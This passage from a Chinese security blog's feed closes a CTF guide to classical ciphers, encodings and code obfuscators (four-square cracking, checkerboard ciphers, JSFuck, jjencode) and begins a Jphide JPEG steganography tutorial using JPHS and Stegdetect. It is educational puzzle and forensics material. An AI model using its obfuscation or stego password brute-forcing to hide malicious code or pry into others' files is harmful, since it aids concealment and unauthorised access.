DOG&apos;)&apos;ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ&apos;&gt;&gt;&gt;fs.decipher(&apos;ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ&apos;)&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</code></pre><p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/four-square/" target="_blank" rel="external">传送门</a></p><p><strong>（3）未知密钥矩阵破解</strong></p><p>推荐一篇关于采用<a href="http://blog.csdn.net/xianlingmao/article/details/7798647" target="_blank" rel="external">模拟退火算法</a>的<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-foursquare-cipher/" target="_blank" rel="external">四方密码分析</a>文章，如果有足够多的密文那么四方密码可以轻易被破解，如果知道了明文和密文推出密钥是很容易的，猜测部分明文是一个有效的方法去破解四方密码，如果一部分明文已知或者可以被猜测出<br>那么我们首先要确定尽可能多可利用的密钥，然后才可以进行更多的推测或者用其他的方法破译。基于四方密码分析一文实现的<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-foursquare-cipher/" target="_blank" rel="external">C代码</a>破解示例：</p><p>密文(密文最好在200个字符以上)：</p><p>HMMKEQESDTMDHLAWFWMNKSOSFOMRFNLWLKHNSQGGEKXEOLLVDXNRSQQGARTFKSAVNUDLFNDHESPZGQ<br>TWESAGPGSQSQSTPKUSBBQLQHESAGPGSQSQGXLNAVHTPMHMKKNYGSUGDMTPDGFNKYAVHXLWGEKRILESLZ<br>ZOFNAVIHRHRKAGHSMYUGEGNSRGAVMVOQPRLNKRXLMYLQPXILESQYBNRHRKAGKYQXDIHMPGPYOERZOLBEZ<br>LURFWLWUOLDDPNSQYAGMUQPQWESBEZVEQESDTMDBQLWDIUSHB</p><p>用法：</p><pre><code>gcc -O3 -lm foursquarecrack2.c scoreText_2.c -o fsc./fsc</code></pre><p>输出结果：</p><pre><code>Running foursquarecrack, this could take a few minutes... best score so far: -1239.505249, on iteration 1Key: &apos;KFMLUGWSQEPOZTNRBHDAVXCIY&apos;,&apos;UGSVKFIZMOYXPQRWTHLNCABED&apos;     plaintext: &apos;THECIPHERTEXTSQUARESCANBEGENERATEDUSINGAKEYWORDDROPPINGDUPLICAT            ELETTERSTHENFILLTHEREMAININGSPACESWITHTHEREMAININGLETTERSOFTHEA            LPHABETINORDERALTERNATIVELYTHECIPHERTEXTSQUARESCANBEGENERATEDCO            MPLETELYRANDOMLYTHEFOURSQUAREALGORITHMALLOWSFORTWOSEPARATEKEYSO            NEFOREACHOFTHETWOCIPHERTEXTMATRICESX&apos;</code></pre><hr><h4 id="22-棋盘密码"><a href="#22-棋盘密码" class="headerlink" title="22.棋盘密码"></a>22.棋盘密码</h4><p>棋盘密码（Checkerboard Cipher)是使用一个波利比奥斯方阵和两个密钥作为密阵的替换密码，通常在波利比奥斯方阵中J字母往往被包含在I字母中。</p><p>示例密阵：</p><pre><code>   Q  U  I  C  K  --------------B |K  N I/J G  HR |P  Q  R  S  TO |O  Y  Z  U  AW |M  X  W  V  BN |L  F  E  D  C</code></pre><p>经过密阵替换:</p><pre><code>明文:T  H  E  Q  U  I  C  K  B  R  O  W  N  F  O  X密文:RK BK RU OC OC BI NK BQ WK RI OQ WI BU NU OQ WU</code></pre><hr><h4 id="23-跨棋盘密码"><a href="#23-跨棋盘密码" class="headerlink" title="23.跨棋盘密码"></a>23.跨棋盘密码</h4><p>跨棋盘密码(Straddle Checkerboard Cipher)是一种替换密码，当这种密码在结合其他加密方式，加密效果会更好。</p><p>棋盘示例(选择3和7作为变换):</p><pre><code>   0 1 2 3 4 5 6 7 8 9   f k m   c p d   y e3: h b i g q r o s a z7: l u t j n w v x    </code></pre><p>明文: <code>T H E Q U I C K B R O W N F O X</code></p><p>经过加密棋盘替换得到密文:<code>72 30 9 34 71 32 4 1 31 35 36 75 74 0 36 77</code></p><p>当然我们还可以继续用其他的加密方式在对跨棋盘密码加密出的结果再进行加密:</p><p>示例变换密钥:83729</p><pre><code> 8372983729837298372983729837+7230934713241313536757403677----------------------------- 5502817432078501808630122404</code></pre><p>在经过棋盘转换后:</p><pre><code>5502817432078501808630122404ppfmyk n if  pfkyfyd hkmmcfc</code></pre><p>最终得到密文: ppfmyk n if pfkyfyd hkmmcfc</p><p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/straddle-checkerboard/" target="_blank" rel="external">传送门</a></p><hr><h4 id="24-分组摩尔斯替换密码"><a href="#24-分组摩尔斯替换密码" class="headerlink" title="24.分组摩尔斯替换密码"></a>24.分组摩尔斯替换密码</h4><p>分组摩尔斯替换密码(Fractionated Morse Cipher)首先把明文转换为莫尔斯电码，不过每个字母之间用<code>x</code>分开，每个单词用<code>xx</code>分开。然后使用密钥生成一个替换密表，这个密表包含所有<code>. - x</code>组合的情况(因为不会出现<code>xxx</code>的情况，所以一共26种组合)。</p><p>密钥:<code>MORSECODE</code></p><p>密表:</p><pre><code>MORSECDABFGHIJKLNPQTUVWXYZ.........---------XXXXXXXX...---XXX...---XXX...---XX.-X.-X.-X.-X.-X.-X.-X.-X.-</code></pre><p>说明:密表下半部分是固定的，密表的安全性以及加密效果主要取决于使用的密钥。</p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>(类似)摩尔斯电码:</p><pre><code>-x....x.xx--.-x..-x..x-.-.x-.-xx-...x.-.x---x.--x-.xx..-.x---x-..-xx.---x..- --x.--.x...xx---x...-x.x.-.xx-x....x.xx.-..x.-x--..x-.--xx-..x---x--.</code></pre><p>说明:明文在转换为(类似)摩尔斯电码后进行每3个字符分组，再进行密表的查表。</p><p>密文(经过密表替换):<code>LMUWC OQVHG ZMTAK EVYSW NOYJQ NLIQB JQCDH XMDYF TWRGP FWNH</code></p><p>已知密钥在线加解密<a href="http://ruffnekk.stormloader.com/fractmorse_tool.html" target="_blank" rel="external">传送门</a></p><hr><h4 id="25-Bazeries密码"><a href="#25-Bazeries密码" class="headerlink" title="25.Bazeries密码"></a>25.Bazeries密码</h4><p>Bazeries密码(Bazeries Cipher)是换位密码和替换密码的组合，使用两个波利比奥斯方阵，一个明文字母方阵，使用一个随机的数字(一般小于1000000)的生成一个密钥矩阵同时作为第一轮明文划分分组，比如2333这个数字翻译为英文便是TWO THOUSAND THREE HUNDRED THIRTY THREE,从第一个字母T开始选取不重复的字母，之后再从字母表中按序选取没有出现的字母组成密钥矩阵。</p><p>明文:<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>随机数字:<code>2333</code></p><p>明文矩阵:</p><pre><code>A  F  L  Q  VB  G  M  R  WC  H  N  S  XD I/J O  T  YE  K  P  U  Z</code></pre><p>示例密钥矩阵:</p><pre><code>T  W  O  H  US  A  N  D  RE I/J Y  B  CF  G  K  L  MP  Q  V  X  Z</code></pre><p>明文分组:</p><pre><code>2   3   3   3   2   3   3   3  2   3   3  3TH EQU ICK BRO WN FOX JUM PSO VE RTH ELA ZYD OG</code></pre><p>分组明文反序:</p><pre><code>HT UQE KCI ORB WN XOF MUJ OSP EV EHT ALE DYZ GO</code></pre><p>使用密钥矩阵替换:</p><pre><code>IL XHP QEG KDS YR CKW NXG KBV PU ILD TOP FMZ AK</code></pre><p>(比如’H’在明文矩阵对应到密钥矩阵的位置就是’I’）</p><p>已知密钥在线加解密<a href="http://ruffnekk.stormloader.com/bazeries_tool.html" target="_blank" rel="external">传送门</a></p><hr><h4 id="26-Digrafid密码"><a href="#26-Digrafid密码" class="headerlink" title="26.Digrafid密码"></a>26.Digrafid密码</h4><p>Digrafid密码(Digrafid Cipher)使用两个密钥生成分别生成类似波利比奥斯方阵的3x9方格的密表。，主要有3分组和4分组两类。</p><p>第一个方阵密钥:<code>digrafid</code></p><p>第二个方阵密钥:<code>cipher</code></p><p>密表：</p><pre><code>1 2 3 4 5 6 7 8 9D I G R A F D B C 1 2 3E H J L M N O P Q 4 5 6S T U V W X Y Z # 7 8 9                  c f s 1                  i g t 2                  p j u 3                  h k v 4                   e l w 5                     r m x 6                  a n y 7                  b o z 8                  d q # 9</code></pre><p>明文:<code>THE QUICK BROWN FOX</code></p><p>密表转换(以4分组为例):</p><pre><code>Th Eq Ui Ck   Br Ow Nf Ox2  1  3  9      8  7     6  77  5  7  2    1  6    5  64  9  2  4    6  5    1  6</code></pre><p>说明:T在第一矩阵第2列，h在第二矩阵第4行，T所在的行与h所在的列相交的位置数字为7，所以Th表示为274。</p><p>转换密文:</p><pre><code>213 975 724 924   876 716 566 516Ip  #e  Dk  Ck    Zr  Dr  Mx  Ar</code></pre><hr><p>####27.格朗普雷密码####</p><p>格朗普雷密码(Grandpré Cipher)是替换密码的一种，一般使用8个8字母的单词横向填充8x8方阵，且第一列为一个单词，并且在方阵中26个字母都必须出现一次以上。</p><p>示例密阵:</p><p><img src="http://img1.tuicool.com/EJ7v632.jpg" alt="格朗普雷密码.jpg"></p><pre><code>明文:T  H  E  Q  U  I  C  K  B  R  O  W  N  F  O 密文:84 27 82 41 51 66 31 36 15 71 67 73 52 34 67</code></pre><p>说明：明文中的字母在密阵位置可能不止一个，所以加密结果可能有多种，但是不影响解密。密阵还有6x6，7x7，9x9,10x10几种。显然密阵越大每个字母被替换的情况就可能越多，那么加密效果就更好。</p><hr><h4 id="28-比尔密码"><a href="#28-比尔密码" class="headerlink" title="28.比尔密码"></a>28.比尔密码</h4><p>比尔密码(Beale ciphers)有三份密码，当然这里说的是已被破解第二份，是一种类似书密码的替换密码。</p><p><img src="http://img2.tuicool.com/fIbIBra.png" alt="比尔密码.png"></p><p>以第二密码为例，每一个数字代表美国《独立宣言》的文本中的第几个词的首字母，如1代表第1个词的首字母“w”，2代表第2个词首字母“i”。解密后的文字如下：</p><p>I have deposited in the county of Bedford…</p><p>比尔密码还有一段有趣的故事，感兴趣可以看一下比尔密码的<a href="https://zh.wikipedia.org/wiki/%E6%AF%94%E5%B0%94%E5%AF%86%E7%A0%81" target="_blank" rel="external">详细介绍</a>。</p><h4 id="29-键盘密码"><a href="#29-键盘密码" class="headerlink" title="29.键盘密码"></a>29.键盘密码</h4><p>一般用到的键盘密码就是手机键盘和电脑键盘两种，2014 0ctf比赛里Crypto类型中Classic一题就是电脑键盘密码，详细可以<a href="http://www.programlife.net/0ops-ctf-writeup.html" target="_blank" rel="external">参考</a>，另外给出另外一些<a href="http://www.secbox.cn/hacker/ctf/8078.html" target="_blank" rel="external">参考</a>情况。</p><h3 id="其他有趣的机械密码"><a href="#其他有趣的机械密码" class="headerlink" title="其他有趣的机械密码"></a>其他有趣的机械密码</h3><hr><h4 id="1-恩尼格玛密码"><a href="#1-恩尼格玛密码" class="headerlink" title="1.恩尼格玛密码"></a>1.恩尼格玛密码</h4><p>恩尼格玛密码机（德语：Enigma，又译哑谜机，或“谜”式密码机）是一种用于加密与解密文件的密码机。确切地说，恩尼格玛是对二战时期纳粹德国使用的一系列相似的转子机械加解密机器的统称，它包括了许多不同的型号，为密码学对称加密算法的流加密。详细工作原理参考<a href="https://zh.wikipedia.org/wiki/%E6%81%A9%E5%B0%BC%E6%A0%BC%E7%8E%9B%E5%AF%86%E7%A0%81%E6%9C%BA" target="_blank" rel="external">维基百科</a>。</p><p><img src="http://img0.tuicool.com/aQzqIbN.jpg" alt="恩尼格玛密码.jpg"></p><p>在线模拟<a href="http://enigmaco.de/enigma/enigma.html" target="_blank" rel="external">传送门</a></p><p>感兴趣可以观看<a href="http://list.youku.com/albumlist/show?id=23400097&amp;ascending=1&amp;page=1" target="_blank" rel="external">播单:计算机历史文化课</a></p><hr><h3 id="代码混淆加密"><a href="#代码混淆加密" class="headerlink" title="代码混淆加密"></a>代码混淆加密</h3><p>1.<a href="http://www.zhaoyuanma.com/aspfix.html" target="_blank" rel="external">asp混淆加密</a></p><p>2.<a href="http://www.zhaoyuanma.com/phpjmvip.html" target="_blank" rel="external">php混淆加密</a></p><p>3.<a href="http://tool.css-js.com/" target="_blank" rel="external">css/js混淆加密</a></p><p>4.<a href="http://www.zhaoyuanma.com/aspfix.html" target="_blank" rel="external">VBScript.Encode混淆加密</a></p><hr><h4 id="5-ppencode"><a href="#5-ppencode" class="headerlink" title="5.ppencode"></a>5.ppencode</h4><p>ppencode-Perl把Perl代码转换成只有英文字母的字符串。</p><p><img src="http://img1.tuicool.com/R3mUFjR.png" alt="ppencode.png"></p><p>ppencode<a href="http://namazu.org/~takesako/ppencode/demo.html" target="_blank" rel="external">传送门</a></p><hr><h4 id="6-rrencode"><a href="#6-rrencode" class="headerlink" title="6.rrencode"></a>6.rrencode</h4><p>rrencode可以把ruby代码全部转换成符号。</p><p><img src="http://img0.tuicool.com/QzYBzyA.jpg" alt="rrencode.jpg"></p><p>rrencode<a href="http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html" target="_blank" rel="external">传送门</a></p><hr><h4 id="7-jjencode-aaencode"><a href="#7-jjencode-aaencode" class="headerlink" title="7.jjencode/aaencode"></a>7.jjencode/aaencode</h4><p>jjencode将JS代码转换成只有符号的字符串，类似于rrencode，介绍的<a href="http://utf-8.jp/public/20090710/jjencode.pps" target="_blank" rel="external">PPT</a>，aaencode可以将JS代码转换成常用的网络表情，也就是我们说的颜文字js加密。</p><p><img src="http://img1.tuicool.com/Rb6beqy.png" alt="aaencode.png"></p><p>aaencode<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="external">传送门</a></p><p>jjencode/aaencode的解密直接在浏览器的控制台里输入密文即可执行解密，想要详细了解jjencode是如何进行请<a href="http://pferrie2.tripod.com/papers/jjencode.pdf" target="_blank" rel="external">参考</a>，你也可以在github上<a href="https://github.com/jacobsoo/Decoder-JJEncode" target="_blank" rel="external">下载</a>实现jjdecoder的源码进行分析。</p><p><img src="http://img2.tuicool.com/R77bMvj.png" alt="aaencode解密.png"></p><hr><h4 id="8-JSfuck"><a href="#8-JSfuck" class="headerlink" title="8.JSfuck"></a>8.JSfuck</h4><p>JSFuck 可以让你只用 6 个字符<code>[ ]( ) ! +</code>来编写 JavaScript 程序。</p><p><img src="http://img1.tuicool.com/VvayAz.png" alt="JSfuck.png"></p><p>JSfuck<a href="http://www.jsfuck.com/" target="_blank" rel="external">传送门</a></p><hr><h4 id="9-jother"><a href="#9-jother" class="headerlink" title="9.jother"></a>9.jother</h4><p>jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：<code>! + ( ) [ ] { }</code>。只用这些字符就能完成对任意字符串的编码。</p><p><a href="http://drops.wooyun.org/author/do9gy" target="_blank" rel="external">do9gy</a>的<a href="http://drops.wooyun.org/web/4410" target="_blank" rel="external">jother编码之谜</a></p><p><img src="http://img1.tuicool.com/7FbiQf3.png" alt="jother.png"></p><p>jother编码<a href="http://tmxk.org/jother/" target="_blank" rel="external">传送门</a></p><p>jother直接在浏览器(IE可以)的控制台里输入密文即可执行解密：</p><p><img src="http://img1.tuicool.com/ayYBJra.png" alt="jother解密.png"></p><hr><h3 id="10-brainfuck"><a href="#10-brainfuck" class="headerlink" title="10.brainfuck"></a>10.brainfuck</h3><p>Brainfuck是一种极小化的计算机语言，按照”Turing complete（完整图灵机）”思想设计的语言，它的主要设计思路是：用最小的概念实现一种“简单”的语言，BrainF**k 语言只有八种符号，所有的操作都由这八种符号(<code>&gt; &lt; + - . , [ ]</code>)的组合来完成。</p><p>明文：hello!</p><pre><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ .---. +++++ ++..+ ++.&lt;+ +++++ +++++[-&gt;++ +++++ ++++&lt; ]&gt;+++ ++++. &lt;++++ +++[- &gt;---- ---&lt;] &gt;--.&lt; +++++ ++[-&gt;----- --&lt;]&gt; ----- ----- .&lt;</code></pre><p>brainfuck<a href="http://www.splitbrain.org/services/ook" target="_blank" rel="external">传送门</a></p><p>其他稀奇古怪的编程语言请<a href="http://news.mydrivers.com/1/190/190926.htm" target="_blank" rel="external">参考</a></p><h3 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h3><hr><p><a href="http://www.wechall.net/applet/JPK_406.jar" target="_blank" rel="external">JPK神器</a></p><p><a href="https://github.com/jameslyons/python_cryptanalysis" target="_blank" rel="external">密码破解脚本</a></p><p><a href="https://dl.packetstormsecurity.net/shellcode/shellcodeencdec.py.txt" target="_blank" rel="external">shellcode转换脚本</a></p><h3 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h3><hr><p><a href="https://en.wikipedia.org/wiki/Classical_cipher" target="_blank" rel="external">Wikipedia Classical Cipher</a></p><p><a href="http://cryptogram.org/cipher_types.html" target="_blank" rel="external">Cryptogram Cipher Types</a></p><p><a href="http://www.practicalcryptography.com/" target="_blank" rel="external">Practical Cryptography</a></p><p><a href="http://rumkin.com/tools/cipher/" target="_blank" rel="external">Rumkin Cipher Tools</a></p><p><a href="https://encode-decode.appspot.com/" target="_blank" rel="external">encode-decode</a></p><p><a href="https://www.hackfun.org/" target="_blank" rel="external">4ido10n Blog</a></p><p><a href="http://wordsmith.org/anagram/" target="_blank" rel="external">Anagram</a></p><p><a href="http://www.thonky.com/kryptos/" target="_blank" rel="external">Thonky</a></p>]]></content>
    
    <summary type="html">
    
      #0X00-前言0X00 前言
正文开始之前先闲扯几句吧，玩CTF的小伙伴也许会遇到类似这样的问题:表哥，你知道这是什么加密吗？其实CTF中脑洞密码题(非现代加密方式)一般都是各种古典密码的变形，一般出题者会对密文进行一些处理，但是会给留一些线索，所以写此文的目的是想给小伙伴做题时给一些参考，当然常在CTF里出现的编码也可以了解一下。本来是想尽快写出参考的文章，无奈期间被各种事情耽搁导致文章断断续续写了2个月，文章肯定有许多没有提及到，欢迎小伙伴补充，总之，希望对小伙伴们有帮助吧！

#0X01-目录0X01 目录
常见编码:
    1.ASCII编码
    2.Base64/32/16编码
    3.shellcode编码
    4.Quoted-printable编码
    5.XXencode编码
    6.UUencode编码
    7.URL编码
    8.Unicode编码
    9.Escape/Unescape编码
    10.HTML实体编码
    11.敲击码(Tap code)
    12.莫尔斯电码(Morse Code)
    13.编码的故事

各种文本加密

换位加密:
    1.栅栏密码(Rail-fence Cipher)
    2.曲路密码(Curve Cipher)
    3.列移位密码(Columnar Transposition Cipher)

替换加密:
    1.埃特巴什码(Atbash Cipher)
    2.凯撒密码(Caesar Cipher)
    3.ROT5/13/18/47
    4.简单换位密码(Simple Substitution Cipher)
    5.希尔密码(Hill Cipher)
    6.猪圈密码(Pigpen Cipher)
    7.波利比奥斯方阵密码（Polybius Square Cipher)
    8.夏多密码(曲折加密)
    9.普莱菲尔密码(Playfair Cipher)
    10.维吉尼亚密码(Vigenère Cipher)
    11.自动密钥密码(Autokey Cipher)
    12.博福特密码(Beaufort Cipher)
    13.滚动密钥密码(Running Key Cipher)
    14.Porta密码(Porta Cipher)
    15.同音替换密码(Homophonic Substitution Cipher)
    16.仿射密码(Affine Cipher)
    17.培根密码(Baconian Cipher)
    18.ADFGX和ADFGVX密码(ADFG/VX Cipher)
    19.双密码(Bifid Cipher)
    20.三分密码(Trifid Cipher)
    21.四方密码(Four-Square Cipher)
    22.棋盘密码（Checkerboard Cipher)
    23.跨棋盘密码(Straddle Checkerboard Cipher)
    24.分组摩尔斯替换密码(Fractionated Morse Cipher)
    25.Bazeries密码(Bazeries Cipher)
    26.Digrafid密码(Digrafid Cipher)
    27.格朗普雷密码(Grandpré Cipher)
    28.比尔密码(Beale ciphers)
    29.键盘密码(Keyboard Cipher)

其他有趣的机械密码:
    1.恩尼格玛密码

代码混淆加密:
    1.asp混淆加密
    2.php混淆加密
    3.css/js混淆加密
    4.VBScript.Encode混淆加密
    5.ppencode
    6.rrencode
    7.jjencode/aaencode
    8.JSfuck
    9.jother
    10.brainfuck编程语言

相关工具

参考网站
    
    </summary>
    
      <category term="CTF" scheme="https://sunnyelf.github.io/categories/CTF/"/>
    
    
      <category term="换位加密" scheme="https://sunnyelf.github.io/tags/%E6%8D%A2%E4%BD%8D%E5%8A%A0%E5%AF%86/"/>
    
      <category term="古典密码" scheme="https://sunnyelf.github.io/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"/>
    
      <category term="代码混淆加密" scheme="https://sunnyelf.github.io/tags/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/"/>
    
      <category term="常见编码" scheme="https://sunnyelf.github.io/tags/%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81/"/>
    
      <category term="替换加密" scheme="https://sunnyelf.github.io/tags/%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86/"/>
    
      <category term="ctf中那些脑洞大开的编码和加密" scheme="https://sunnyelf.github.io/tags/ctf%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86/"/>
    
      <category term="文本加密" scheme="https://sunnyelf.github.io/tags/%E6%96%87%E6%9C%AC%E5%8A%A0%E5%AF%86/"/>
    
      <category term="机械密码" scheme="https://sunnyelf.github.io/tags/%E6%9C%BA%E6%A2%B0%E5%AF%86%E7%A0%81/"/>
    
      <category term="密码解密工具" scheme="https://sunnyelf.github.io/tags/%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>深入理解JPEG图像格式Jphide隐写</title>
    <link href="https://sunnyelf.github.io/2017/02/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JPEG%E5%9B%BE%E5%83%8F%E6%A0%BC%E5%BC%8FJphide%E9%9A%90%E5%86%99/"/>
    <id>https://sunnyelf.github.io/2017/02/08/深入理解JPEG图像格式Jphide隐写/</id>
    <published>2017-02-07T20:00:00.000Z</published>
    <updated>2017-10-02T19:22:31.865Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-隐写原理"><a href="#0x00-隐写原理" class="headerlink" title="0x00 隐写原理"></a>0x00 隐写原理</h2><p>Jphide是基于最低有效位LSB的<a href="http://www.cnblogs.com/leaven/archive/2010/04/06/1705846.html" target="_blank" rel="external">JPEG格式</a>图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在<a href="https://en.wikipedia.org/wiki/Discrete_cosine_transform" target="_blank" rel="external">DCT变换域</a>上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时<a href="http://baike.baidu.com/link?url=OWM-kQRYlFaJ2Sy7m1E_Z_-fnvknJTRSHwk1f3eoabLsbht1TJa07GmvWRoiOg6U7-0-Ey3vb_UHcDm9Pc7Mgq" target="_blank" rel="external">Blowfish算法</a>有较强的抗统计检测能力。</p><p>由于JPEG图像格式使用<a href="http://baike.baidu.com/view/391624.htm?fr=aladdin&amp;fromtitle=DCT&amp;fromid=4184&amp;type=syn" target="_blank" rel="external">离散余弦变换</a>（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种<a href="http://baike.baidu.com/link?url=7eIl--nFUaz-amKaY9jatpW4J-J2JyZEXy8dYJM4Py1CspzR9mUATKgTyXOCt7M6AjFSv4JmF3YKtXTTAauHm_" target="_blank" rel="external">有损压缩</a>（Loss Compression）技术，但一般不会影响图像的视觉效果。</p><h2 id="0x01-隐写过程"><a href="#0x01-隐写过程" class="headerlink" title="0x01 隐写过程"></a>0x01 隐写过程</h2><p>Jphide隐写过程大致为：先解压压缩JPEG图像，得到DCT系数；然后对隐藏信息用户给定的密码进行Blowfish加密；再利用Blowfish算法生成伪随机序列，并据此找到需要改变的DCT系数，将其末位变为需要隐藏的信息的值。最后把DCT系数重新压回成JPEG图片，下面是个人对隐写过程理解画出的大致流程图。</p><p><img src="http://i.imgur.com/kb6USbH.png" alt=""></p><a id="more"></a><h2 id="0x02-隐写实现"><a href="#0x02-隐写实现" class="headerlink" title="0x02 隐写实现"></a>0x02 隐写实现</h2><p><strong>（1）Stegdetect</strong></p><p>实现JPEG图像Jphide隐写算法工具有多个，比如由Neils Provos开发通过统计分析技术评估JPEG文件的DCT频率系数的隐写工具<a href="https://github.com/abeluck/stegdetect" target="_blank" rel="external">Stegdetect</a>，它可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息，并且还具有基于字典暴力破解密码方法提取通过Jphide、outguess和jsteg-shell方式嵌入的隐藏信息。</p><p><strong>（2）JPHS</strong></p><p>而这里介绍另一款JPEG图像的信息隐藏软件<a href="http://io.acad.athabascau.ca/~grizzlie/Comp607/programs.htm" target="_blank" rel="external">JPHS</a>，它是由Allan Latham开发设计实现在Windows和Linux系统平台针对有损压缩JPEG文件进行信息加密隐藏和探测提取的工具。软件里面主要包含了两个程序JPHIDE和JPSEEK， JPHIDE程序主要是实现将信息文件加密隐藏到JPEG图像功能，而JPSEEK程序主要实现从用JPHIDE程序加密隐藏得到的JPEG图像探测提取信息文件，Windows版本的JPHS里的JPHSWIN程序具有图形化操作界面且具备JPHIDE和JPSEEK的功能。</p><p><img src="http://i.imgur.com/BzbsFlS.png" alt=""></p><p>1.Windows用户请下载<a href="http://io.acad.athabascau.ca/~grizzlie/Comp607/jphs05.zip" target="_blank" rel="external">JPHS-05 for Windows</a>,同时也提供下载<a href="http://linux01.gwdg.de/~alatham/stego.html" target="_blank" rel="external">Linux版本</a>。</p><p>2.分别准备一个JPEG格式的图片（example.jpg）和一个文本文件（flag.txt）。</p><p><img src="http://i.imgur.com/C8DQKFo.png" alt=""></p><p>由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG格式-JPEG文件交换格式（JPEG File Interchange Format，JFIF）作为示例。</p><p>这里简单介绍JPEG文件交换格式的JPEG图片的图像开始标记SOI（Start of Image）和应用程序保留标记APP0（Application 0），JPEG文件交换格式的JPEG图片开始前2个字节是图像开始标记为0xFFD8，之后2个字节接着便是应用程序保留标记为0xFFE0，应用程序保留标记APP0包含9个具体字段，这里介绍前三个字段，第一个字段是数据长度占2个字节，表示包括本字段但不包括标记代码的总长度，这里为10个字节，第二个字段是标识符占5个字节0x4A46494600表示“JFIF0”字符串，第三个字段是版本号占2个字节，这里是0X0101，表示JFIF的版本号为1.1，但也可能为其它数值，从而代表了其它版本号。</p><p><img src="http://i.imgur.com/ciEvX2s.png" alt=""></p><p>3.Windows版本可以使用具有图形化操作界面的Jphswin，选择“Open jpeg”打开示例JPEG格式图片example.jpg</p><p><img src="http://i.imgur.com/kipH6L0.png" alt=""></p><p>如果你选择的不是JPEG格式的图片程序会自动退出，你可以16进制编辑器如Winhex查看图片的图像开始标记SOI和应用程序保留标记APP0，当载入JPEG格式图片会显示一些图片的属性。</p><p><img src="http://i.imgur.com/ImK54U1.png" alt=""></p><p>4.选择“Hide”选项之后在两次文本框输入相同的密码，这里以输入flag作为密码为例，然后输入要包含隐藏信息的文本。</p><p><img src="http://i.imgur.com/QYrSVtE.png" alt=""></p><p>5.选择将要隐藏的信息如flag.txt。</p><p><img src="http://i.imgur.com/XfbEvQS.png" alt=""></p><p>6.选择“Save jpeg as”选项将图片另存为jpeg格式并输入文件的名称为新的图像文件如C4n-u-find-f14g.jpg。</p><p><img src="http://i.imgur.com/sj8X3aP.png" alt=""></p><p>7.之后便可以看到生成结果和相关信息。</p><p><img src="http://i.imgur.com/HPkvnci.png" alt=""></p><p>8.第2步到第7步做的是Jhide方式信息隐藏，接下来我们从C4n-u-find-f14g.jpg图片提取出隐藏信息。</p><p><img src="http://i.imgur.com/H9QJnHU.jpg" alt=""></p><p>9.如果之前你并不知道图片是基于什么方式进行信息隐藏，你可以使用Stegdetect先进行探测。</p><p>Stegdetect的主要选项如下：</p><blockquote><p>-q 仅显示可能包含隐藏内容的图像。</p><p>-n 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。</p><p>-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</p><p>-d 打印带行号的调试信息。</p><p>-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</p><ul><li>j 检测图像中的信息是否是用jsteg嵌入的。</li><li>o 检测图像中的信息是否是用outguess嵌入的。</li><li>p 检测图像中的信息是否是用jphide嵌入的。</li><li>i 检测图像中的信息是否是用invisible secrets嵌入的。</li></ul><p>-V 显示软件版本号。</p><p>如果检测结果显示该文件可能包含隐藏信息，那么Stegdetect会在检测结果后面使用1～3颗星来标识<br>隐藏信息存在的可能性大小，3颗星表示隐藏信息存在的可能性最大。</p></blockquote><p>从下图可以看出很可能是Jphide的信息隐藏方式：</p><p><img src="http://i.imgur.com/i3zeRUx.png" alt=""></p><p>10.在知道隐藏方式之后可以开始进行信息提取，和使用JPHS进行信息隐藏过程类似，打开需要提取隐藏信息的图片C4n-u-find-f14g.jpg，输入对应密码（在不知道密码的情况不可以尝试Stegdetect工具里的Stegbreak程序进行基于字典的暴力攻击）flag，密码验证通过JPHS会自动提取隐藏信息，之后便可以另存提取出的信息。</p><p><img src="http://i.imgur.com/aCnBL4u.png" alt=""></p><p>11.打开提取得到的find.txt便可以得到我们想要的隐藏信息。</p><p><img src="http://i.imgur.com/1whWnla.png" alt=""></p><h2 